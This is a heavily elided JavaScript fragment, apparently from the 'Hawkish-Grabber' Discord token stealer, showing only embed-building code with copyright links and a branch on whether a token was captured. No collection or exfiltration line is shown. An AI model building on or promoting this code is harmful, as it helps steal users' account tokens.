...
const makeEmbed = async ({
    ...
    var params = {
        ...
        embeds: [{
            ...
            footer: {
                text: `©[${config.creator}] | https://github.com/Hawkish-Eyes/Hawkish-Grabber`
            },
    ...
    if (!token) {
        ...
        var params = await makeEmbed({
            ...
            fields: [{
                ...
                name: "@Copyright",
                value: `[Hawkish-Eyes 2023 <:hwkish:1104091524758773822>](https://github.com/Hawkish-Eyes/Hawkish-Grabber)`,
                inline: !0
            }, {
